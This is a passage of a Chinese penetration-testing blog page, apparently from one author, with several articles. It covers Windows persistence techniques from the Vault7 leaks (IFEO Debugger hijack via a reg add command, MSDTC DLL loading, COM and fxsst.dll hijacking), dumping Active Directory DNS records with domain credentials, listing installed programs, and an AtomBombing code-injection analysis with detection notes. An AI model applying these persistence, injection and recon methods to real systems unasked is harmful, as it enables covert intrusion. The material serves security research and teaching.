<p>VBR全称<code class="language-plaintext highlighter-rouge">Volume Boot Record</code> (also known as the Partition Boot Record)</p>

<p>对应工具为<code class="language-plaintext highlighter-rouge">Stolen Goods 2.0</code>(未公开)</p>

<p>Stolen Goods的说明文档地址：</p>

<p>https://wikileaks.org/vault7/document/StolenGoods-2_0-UserGuide/</p>

<p><strong>特点：</strong></p>

<ul>
  <li>能够在Windows启动过程中加载驱动(驱动无需签名)</li>
  <li>适用WinXP(x86)、Win7(x86/x64)</li>
</ul>

<p>该方法取自https://github.com/hzeroo/Carberp</p>

<p><strong>注：</strong></p>

<p>https://github.com/hzeroo/Carberp内包含的源码值得深入研究</p>

<h2 id="0x03-image-file-execution-options">0x03 Image File Execution Options</h2>
<hr>

<p>通过配置注册表实现执行程序的重定向</p>

<p>修改方式(劫持notepad.exe)：</p>

<p>注册表路径：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</code></p>

<p>新建项<code class="language-plaintext highlighter-rouge">notepad.exe</code></p>

<p>新建字符串值,名称：<code class="language-plaintext highlighter-rouge">notepad.exe</code>，路径<code class="language-plaintext highlighter-rouge">"C:\windows\system32\calc.exe"</code></p>

<p>对应cmd命令为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\calc.exe" /f
</code></pre></div></div>

<p>启动notepad.exe，实际执行的程序为<code class="language-plaintext highlighter-rouge">"C:\windows\system32\calc.exe"</code></p>

<p><strong>注：</strong></p>

<p>通常情况下，修改该位置的注册表会被杀毒软件拦截</p>

<h2 id="0x04-ocidll-service-persistence">0x04 OCI.DLL Service Persistence</h2>
<hr>

<p>利用MSDTC服务加载dll，实现自启动</p>

<p>Shadow Force曾经在域环境中使用过的一个后门，通过说明文档猜测CIA也发现了该方法可以在非域环境下使用</p>

<p>我在之前的文章介绍过这种利用方法，地址为：</p>

<p>https://3gstudent.github.io/Use-msdtc-to-maintain-persistence/</p>

<p>我的文章使用的方法是将dll保存在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\</code>下</p>

<p>CIA使用的方法是将dll保存在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wbem\</code>下</p>

<p>这两个位置都可以，MSDTC服务在启动时会依次查找以上两个位置</p>

<h2 id="0x05-shell-extension-persistence">0x05 Shell Extension Persistence</h2>
<hr>

<p>通过COM dll劫持explorer.exe的启动过程</p>

<p>该思路我在之前的文章也有过介绍，地址如下：</p>

<p>https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/</p>

<p><strong>注：</strong></p>

<p>该方法曾被多个知名的恶意软件使用过，例如<code class="language-plaintext highlighter-rouge">COMRAT</code>、<code class="language-plaintext highlighter-rouge">ZeroAccess rootkit</code>和<code class="language-plaintext highlighter-rouge">BBSRAT</code></p>

<h2 id="0x06-windows-fax-dll-injection">0x06 Windows FAX DLL Injection</h2>
<hr>

<p>通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载</p>

<p>Explorer.exe在启动时会加载<code class="language-plaintext highlighter-rouge">c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)</p>

<p>将payload.dll保存在<code class="language-plaintext highlighter-rouge">c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载</p>

<p>较早公开的利用方法，参考链接如下：</p>

<p>https://room362.com/post/2011/2011-06-27-fxsstdll-persistence-the-evil-fax-machine/</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对Vault7中<code class="language-plaintext highlighter-rouge">Remote Development Branch (RDB)</code>中提到的Windows后门利用方法进行了分析，可以看到，这部分内容会借鉴已公开的利用方法</p>

<p>我对已公开的Windows后门利用方法做了一个系统性的搜集(也包括我自己公开的方法)，地址如下：</p>

<p>https://github.com/3gstudent/Pentest-and-Development-Tips/blob/master/README.md#tips-30-windows-persistence</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 20, 2017
  </div>

  
</article><article class="post">
  <h1>域渗透——普通用户权限获得DNS记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/">《域渗透——DNS记录的获取》</a>介绍了域渗透中获得DNS管理员权限后获取DNS记录的方法，而更普遍的情况是只有域普通用户的权限，也需要获得DNS记录。</p>

<p>本文将会参考公开的资料，整理域普通用户获得DNS记录的方法，修复dns-dump.ps1在高版本Windows系统下的bug</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>实现原理</li>
  <li>开源的工具和方法</li>
</ul>

<h2 id="0x02-实现原理">0x02 实现原理</h2>
<hr>

<h3 id="1sharpadidnsdump的实现原理">1.SharpAdidnsdump的实现原理</h3>

<p>先通过LDAP查询获得域内计算机的名称，再通过DNS查询获得对应的IP</p>

<p>详细实现细节可参考：</p>

<p>https://github.com/b4rtik/SharpAdidnsdump</p>

<p>测试环境： test.com</p>

<h4 id="1通过ldap查询获得域内计算机的名称">(1)通过LDAP查询获得域内计算机的名称</h4>

<p>对应LDAP的查询参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LDAP://test.com/DC=test.com,CN=microsoftdns,DC=DomainDnsZones,DC=test,DC=com
(&amp;(!(objectClass=DnsZone))(!(DC=@))(!(DC=*arpa))(!(DC=*DNSZones)))
</code></pre></div></div>

<h4 id="2通过dns查询获得域内计算机对应的ip">(2)通过DNS查询获得域内计算机对应的IP</h4>

<p>使用<code class="language-plaintext highlighter-rouge">Dns.GetHostEntry</code>方法，参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/api/system.net.dns.gethostentry?redirectedfrom=MSDN&amp;view=netframework-3.5#System_Net_Dns_GetHostEntry_System_String_</p>

<h3 id="2dns-dump的实现原理">2.dns-dump的实现原理</h3>

<p>先通过LDAP查询获得DNS记录，对二进制的DNS记录进行解码，获得实际内容</p>

<p>DNS记录解码的细节可参考：</p>

<p>https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1#L483</p>

<h2 id="0x03-开源的工具和方法">0x03 开源的工具和方法</h2>
<hr>

<p>测试环境：</p>

<ul>
  <li>test.com</li>
  <li>Server2012 R2</li>
</ul>

<h3 id="1先通过ldap查询获得域内计算机的名称再通过dns查询获得对应的ip">1.先通过LDAP查询获得域内计算机的名称，再通过DNS查询获得对应的IP</h3>

<h4 id="1sharpadidnsdump">(1)SharpAdidnsdump</h4>

<p>https://github.com/b4rtik/SharpAdidnsdump</p>

<p>C#实现，用于查询DNS记录</p>

<p>用法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SharpAdidnsdump test.com
</code></pre></div></div>

<p>获得的结果完整，同dnscmd的结果一致</p>

<p><strong>注：</strong></p>

<p>dnscmd的用法可以参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DNS%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96/">《域渗透——DNS记录的获取》</a></p>

<h4 id="2adidnsdump">(2)adidnsdump</h4>

<p>https://github.com/dirkjanm/adidnsdump</p>

<p>https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/</p>

<p>Python实现，用于查询DNS记录</p>

<p>适用于Linux，由于需要安装impacket，因此无法直接在Windows系统下使用</p>

<p>安装方法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
cd ..
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .
</code></pre></div></div>

<p>需要先获得一个域用户的凭据(明文口令或NTLM hash)</p>

<p>用法1.直接远程查询：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adidnsdump -u test\\testuser1 -p test123! dc.test.com -r
</code></pre></div></div>

<p>用法2.通过socks代理进行查询：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains adidnsdump -u test\\testuser1 -p test123! dc.test.com -r --dns-tcp
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>还可以使用NTLM hash作为登录凭据</p>

<h3 id="2先通过ldap查询获得dns记录对二进制的dns记录进行解码获得实际内容">2.先通过LDAP查询获得DNS记录，对二进制的DNS记录进行解码，获得实际内容</h3>

<h4 id="1dns-dump">(1)dns-dump</h4>

<p>https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1</p>

<p>Powershell实现，用于查询DNS记录</p>

<p>这个powershell脚本较为古老，我在我的测试环境Server2008R2和Server2012R2下均失败</p>

<p>经过分析，需要修改LDAP的查询语句，新的脚本已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-Powershell/blob/master/dns-dump.ps1</p>

<p>用法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Powershell -ep bypass -f dns-dump.ps1 -zone test.com
</code></pre></div></div>

<p>获得的结果完整，同dnscmd的结果一致</p>

<h4 id="2powerview">(2)PowerView</h4>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<p>也可用于查询DNS记录</p>

<p>其中的Convert-DNSRecord可用来对二进制的DNS记录进行解码：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L1814</p>

<p>用法如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module PowerView.ps1
Get-DNSRecord -ZoneName test.com
</code></pre></div></div>

<h3 id="3其他工具">3.其他工具</h3>

<h4 id="1adfind">(1)AdFind</h4>

<p>C++实现(未开源)，用于查询域内信息</p>

<p>http://www.joeware.net/freetools/tools/adfind/index.htm</p>

<p>常用命令如下：</p>

<p>列出域控制器名称：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -sc dclist
</code></pre></div></div>

<p>查询当前域中在线的计算机：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -sc computers_active
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>对应的LDAP查询条件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Transformed Filter: (&amp;(objectcategory=computer)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(pwdlastset&gt;=131932198595370000)(|(!lastlogontimestamp=*)(&amp;(lastlogontimestamp=*)(lastlogontimestamp&gt;=131932198595370000))))
</code></pre></div></div>

<p>查询当前域中在线的计算机(只显示名称和操作系统)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -sc computers_active name operatingSystem
</code></pre></div></div>

<p>查询当前域中所有计算机：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -f "objectcategory=computer"
</code></pre></div></div>

<p>查询当前域中所有计算机(只显示名称和操作系统)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -f "objectcategory=computer" name operatingSystem
</code></pre></div></div>

<p>查询域内所有用户：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -users name
</code></pre></div></div>

<p>查询所有GPO：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -sc gpodmp
</code></pre></div></div>

<p>或</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AdFind -gpo
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>查询GPO对应之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了多种域普通用户获得DNS记录的方法，适用于不同的环境，在实际使用过程中，某些情况下AdFind的查询效率较低。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 30, 2019
  </div>

  
</article><article class="post">
  <h1>渗透基础——获得当前系统已安装的程序列表</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近遇到了一个有趣的问题： 我在尝试使用wmi获取当前系统已安装的程序列表时，并不能获得完整的列表。于是做了进一步研究，找出错误原因，改变思路，完成目标。</p>

<p>本文是一篇介绍基础知识的文章，用来解决基本的问题。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过wmi获取当前系统已安装的程序列表</li>
  <li>wmi查询结果不完整的原因</li>
  <li>获取完整程序列表的实现思路</li>
</ul>

<h2 id="0x02-获取当前系统已安装的程序列表">0x02 获取当前系统已安装的程序列表</h2>
<hr>

<h3 id="1使用powershell调用wmi">1、使用powershell调用wmi</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -class Win32_Product
</code></pre></div></div>

<p>对输出结果进行过滤，只显示程序名称，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -class Win32_Product |Select-Object -Property name
</code></pre></div></div>

<p>获得结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/2-1.png" alt="Alt text"></p>

<h3 id="2使用wmic调用wmi">2、使用wmic调用wmi</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product
</code></pre></div></div>

<p>对输出结果进行过滤，只显示程序名称，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table
</code></pre></div></div>

<p>获得结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/2-2.png" alt="Alt text"></p>

<h3 id="3使用wmi-explorer调用wmi">3、使用WMI Explorer调用wmi</h3>

<p>下载地址：</p>

<p>https://wmie.codeplex.com/releases/view/135794</p>

<p>界面化的WMI查询工具，可用来查询wmi支持的类，是研究wmi的好工具</p>

<p>首先点击<code class="language-plaintext highlighter-rouge">Connect</code>连接本机</p>

<p>选中<code class="language-plaintext highlighter-rouge">ROOT\CIMV2</code> -&gt; <code class="language-plaintext highlighter-rouge">Query</code></p>

<p>输入查询命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM Win32_Product
</code></pre></div></div>

<p>获得结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/2-3.png" alt="Alt text"></p>

<h3 id="4通过控制面板查询已安装的程序">4、通过控制面板查询已安装的程序</h3>

<p><code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code></p>

<p>发现部分程序通过wmi查询无法获得，例如Google Chrome，对比结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/2-4.png" alt="Alt text"></p>

<h2 id="0x03-wmi查询结果不完整的原因">0x03 wmi查询结果不完整的原因</h2>
<hr>

<p>通过WMI查询Win32_Product只能获得特定的程序列表</p>

<p>这些程序有一个共同的特征： 安装包由Windows Installer制作，安装过程中调用Windows Installer服务进行安装</p>

<p><strong>说明：</strong></p>

<p>Microsoft Windows Installer： Windows 操作系统的一个组件，是安装和卸载软件的标准基础。</p>

<p>Windows Installer服务： 添加、修改和删除作为Windows Installer程序包提供的应用程序。</p>

<p>除了Microsoft Windows Installer，制作安装包还可使用EasySetup、Setup2Go、Advanced Installer、Qt installer framework和WinRAR</p>

<p>Chrome的在安装过程中不会调用Microsoft Windows Installer组件，所以通过WMI查询Win32_Product无法找到Chrome</p>

<h2 id="0x04-获取完整程序列表的实现思路">0x04 获取完整程序列表的实现思路</h2>
<hr>

<p>我们知道，通过<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>获取的程序列表比较完整，该列表对应注册表键值：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code></p>

<p>每个子健代表列表中的一个程序</p>

<p>所以，可以通过枚举注册表键值的方法获得完整程序列表</p>

<p>值得注意的是64位系统下，注册表存在重定向的问题，也会影响程序列表的显示</p>

<p>32位程序列表对应注册表键值<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\</code></p>

<p>64位程序列表对应注册表键值<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code></p>

<p><strong>注：</strong></p>

<p>这个问题在之前的文章《关于32位程序在64位系统下运行中需要注意的重定向问题》进行过整理</p>

<p>编写powershell脚本实现枚举注册表，获得完整的程序列表</p>

<p>关键代码：</p>

<h3 id="1枚举指定注册表项下的子项">1、枚举指定注册表项下的子项</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall -Name
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/4-1.png" alt="Alt text"></p>

<h3 id="2查询指定注册表项的注册表键值">2、查询指定注册表项的注册表键值</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{4F3742E0-700E-431D-BF19-5B27ED98E8F1}").DisplayName
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-28/4-2.png" alt="Alt text"></p>

<h3 id="3加入foreach循环实现枚举">3、加入foreach循环实现枚举</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
$QueryPath = dir $RegPath -Name
foreach($Name in $QueryPath)
{
    (Get-ItemProperty -Path $RegPath$Name).DisplayName
}
</code></pre></div></div>

<h3 id="4加入判断系统位数自动判断注册表重定向">4、加入判断系统位数，自动判断注册表重定向</h3>

<p>完整代码可参考如下地址：</p>

<p>https://github.com/3gstudent/ListInstalledPrograms</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>通常，已安装的程序会创建快捷方式，所以，尝试枚举快捷方式文件也能获得完整的程序列表</p>

<p>通过wmic获取所有快捷方式：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic PATH Win32_ShortcutFile get name /FORMAT:table
</code></pre></div></div>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过wmi无法获得当前系统已安装程序完整列表的原因，编写powershell脚本，通过枚举注册表项，实现获得程序完整列表。作为一篇介绍基础知识的文章，希望能给新人带来启发。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 28, 2018
  </div>

  
</article><article class="post">
  <h1>AtomBombing利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2016年10月，网络安全公司EnSilo的研究团队公开了一个支持所有Windows系统的代码注入方法，将其命名为AtomBombing。据说该方法能够绕过大多数的安全软件，并且利用的系统缺陷很难被修复。</p>

<p>于是，本文将要根据开源代码和资料，学习原理，测试功能，分析利用思路，总结防御方法</p>

<p>学习资料：</p>

<p>https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows</p>

<p>作者：Tal Liberman</p>

<p>POC：</p>

<p>https://github.com/BreakingMalwareResearch/atom-bombing/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>AtomBombing实现方法</li>
  <li>关键技术</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<h3 id="1atom-table">1、Atom Table</h3>

<p>是一个存储字符串和相应标识符的系统定义表</p>

<p>应用程序将一个字符串放入一个Atom表中，并接收一个16位整数(WORD)作为标识(称为Atom)，可通过该标识访问字符串内容，实现进程间的数据交换</p>

<h4 id="分类">分类：</h4>

<p>(1) Global Atom Table</p>

<p>所有应用程序可用</p>

<p>当一个进程将一个字符串保存到Global Atom Table时，系统生成一个在系统范围内唯一的atom，来标示该字符串。在系统范围之内所有的进程都可以通过该atom(索引)来获得这个字符串,从而实现进程间的数据交换</p>

<p>(2) Local Atom Table</p>

<p>只有当前程序可用，相当于定义一个全局变量，如果程序多次使用该变量，使用Local Atom Table仅需要一次内存操作</p>

<p>参考资料：</p>

<p>https://msdn.microsoft.com/en-us/library/ms649053</p>

<h4 id="常用api">常用API：</h4>

<p>添加一个Global Atom：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ATOM WINAPI GlobalAddAtom(_In_ LPCTSTR lpString);
</code></pre></div></div>

<p>删除一个Global Atom：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ATOM WINAPI GlobalDeleteAtom(_In_ ATOM nAtom);
</code></pre></div></div>

<p>查找指定字符串对应的Global Atom：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ATOM WINAPI GlobalFindAtom(_In_ LPCTSTR lpString);
</code></pre></div></div>

<p>获取指定atom对应的字符串：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UINT WINAPI GlobalGetAtomName(
  _In_  ATOM   nAtom,
  _Out_ LPTSTR lpBuffer,
  _In_  int    nSize
);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用实例可参考如下连接：</p>

<p>https://github.com/sinmx/Windows2K/blob/661d000d50637ed6fab2329d30e31775046588a9/private/windows/base/client/tatom.c</p>

<h3 id="2apc注入">2、APC注入</h3>

<p>APC全称asynchronous procedure call，即异步过程调用</p>

<h4 id="apc注入原理">APC注入原理：</h4>

<p>当线程处于警戒状态时，会检查APC队列，如果APC队列被插入函数指针，该函数将会得到执行</p>

<h4 id="apc注入细节">APC注入细节：</h4>

<p>(1) 当线程调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx，WaitForMultipleObjectsEx或者WaitForSingleObjectEx函数时，会切换到警戒状态(alertable state)</p>

<p><strong>注：</strong></p>

<p>警戒状态可参考：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa363772(v=vs.85).aspx</p>

<p>(2) 当线程进入警戒状态时，会循环检查线程中的APC队列，如果APC队列中存在函数指针，那么就会调用该函数</p>

<p>(3) 使用QueueUserAPC函数向APC队列插入函数指针Loadlibrary()，实现加载DLL</p>

<p>(4) 注入成功后，警戒状态结束，程序继续运行，有可能造成程序不稳定，导致程序崩溃</p>

<p>(5) 如果没有删除APC队列，不能反复注入同一函数</p>

<p>(6) 使用APC注入，需要目标进程中至少有一个线程处于警戒状态或者能够进入警戒状态，否则无法实现APC注入</p>

<p><strong>注：</strong></p>

<p>大部分系统进程都满足条件，支持APC注入</p>

<p>可供参考的APC注入代码：</p>

<p>https://github.com/3gstudent/Inject-dll-by-APC</p>

<h3 id="3shellcode">3、shellcode</h3>

<p>在漏洞利用中，shellCode是指输入到存在漏洞的程序中的代码</p>

<p>相当于一个二进制代码框架，最终会将程序的流程跳转到payload</p>

<h3 id="4payload">4、payload</h3>

<p>主要功能代码(常见的如下载执行、反弹shell、新建用户等)，包含在shellCode中</p>

<h2 id="0x03-实现方法">0x03 实现方法</h2>
<hr>

<h3 id="1将任意数据写入目标进程地址空间中的任意位置write-what-where">1、将任意数据写入目标进程地址空间中的任意位置(Write-What-Where)</h3>

<p>通过读写atom向目标进程传递shellcode</p>

<p>自身进程通过GlobalAddAtom将shellcode添加到Global Atom Table中，目标进程调用GlobalGetAtomName即可从Global Atom Table中获取shellcode</p>

<p>所以接下来的关键是如何使目标进程调用GlobalGetAtomName</p>

<p>Tal Liberman的思路是通过APC注入，使目标进程调用GlobalGetAtomName</p>

<p>但是这里遇到了一个难题，QueueUserAPC函数只能向目标进程传入一个参数，而GlobalGetAtomName需要三个参数</p>

<p>于是Tal Liberman调试了QueueUserAPC函数，发现通过NtQueueApcThread函数能够传递三个参数</p>

<p>该问题得到解决</p>

<h3 id="2执行shellcode">2、执行shellcode</h3>

<p>目标进程调用GlobalGetAtomName从Global Atom Table中获取shellcode后，需要先保存shellcode再执行</p>

<p>第一种实现方法： 找到一段RWX的内存存储并执行</p>

<p>不通用，目前的系统保护机制很难找到这样的内存空间</p>

<p>第二种实现方法： 调用VirtualAllocEx分配一段内存</p>

<p>常用方法</p>

<p><strong>注:</strong></p>

<p>其他常见方法如通过VirtualProtect将shellcode的内存属性设置为可读可写可执行，然后跳到shellcode继续执行在这里的效果并不好，因为需要考虑使用QueueUserAPC函数传入参数的问题</p>

<p>所以Tal Liberman尝试了第三种方法： 找到一段RW的内存写入数据，构造ROP链实现shellcode的执行</p>

<p>寻找一段RW的内存并不难，Tal Liberman选择了KERNELBASE数据段后未使用的空间</p>

<p>ROP链实现了以下功能：</p>

<ol>
  <li>申请RWX内存</li>
  <li>将shellcode从RW内存处拷贝到RWX内存储</li>
  <li>执行</li>
</ol>

<p><strong>注：</strong></p>

<p>在ROP链的构造上，Tal Liberman提供了自己的思路，尽可能简化ROP链，优化思路值得学习</p>

<h3 id="3恢复执行">3、恢复执行</h3>

<p>注入后需要恢复目标进程的执行，使用未公开的函数ZwContinue</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<p>测试系统： Win7 x86</p>

<p>安装python，安装pefile(easy_install pefile)</p>

<p>编译生成AtomBombing.exe、AtomBombingShellcode.exe和AtomBombingShellcode.h</p>

<p><strong>注：</strong></p>

<p>AtomBombingShellcode.h由<code class="language-plaintext highlighter-rouge">\AtomBombingShellcode\Scripts\Post_Link.py</code>生成，可在AtomBombingShellcode工程中的后期生成事件中查看具体参数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-3/2-1.png" alt="Alt text"></p>

<p>启动chrome.exe，执行AtomBombing.exe，注入成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-3/2-2.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-3/2-3.png" alt="Alt text"></p>

<p><strong>补充：</strong></p>

<p>Windows 8.1 update 3和Windows 10添加了一个新的保护机制CFG(Control Flow Guard),CFG的绕过可参考如下链接：</p>

<p>https://blog.ensilo.com/atombombing-cfg-protected-processes</p>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>综合公开资料和实际测试，可以将AtomBombing理解为一个APC注入的升级版： 利用Atom Table传递shellcode，通过NtQueueApcThread实现APC注入，shellcode采用构造ROP链的方式，实现了申请内存、写入payload(弹出计算器)并执行的功能</p>

<p>Atom Table支持Windows全平台，并且短期内该功能不会被取消，也不存在修复措施，所以可以在某种程度上理解为不存在修复AtomBombing的补丁</p>

<p>但是，想实现AtomBombing的利用，需要综合考虑多个问题(如获取处于警戒状态的线程、通过NtQueueApcThread传入参数、寻找RX内存，构造ROP链等)，利用门槛较高</p>

<p>并不适用于所有进程(目标进程中至少有一个线程处于警戒状态或者能够进入警戒状态)</p>

<p>能绕过部分杀毒软件，但不能绕过所有的杀毒软件(使用NtQueueApcThread进行注入)</p>

<h2 id="0x06-检测防御">0x06 检测防御</h2>
<hr>

<p>将AtomBombing理解为APC注入的升级版，所以参照APC注入的防御方法即可，攻击者首先需要获得系统的执行权限，并找到符合条件的进程</p>

<p><strong>检测：</strong></p>

<p>监控NtQueueApcThread函数的调用</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了AtomBombing的实现思路和关键技术，经过实际测试，得出最终结论，AtomBombing是一种新的DLL注入方法，可以理解为一个APC注入的升级版： 利用Atom Table传递shellcode，通过NtQueueApcThread实现APC注入，shellcode采用构造ROP链的方式，实现了申请内存、写入payload(弹出计算器)并执行的功能</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January  3, 2018
  </div>

  
</article><article class="post">
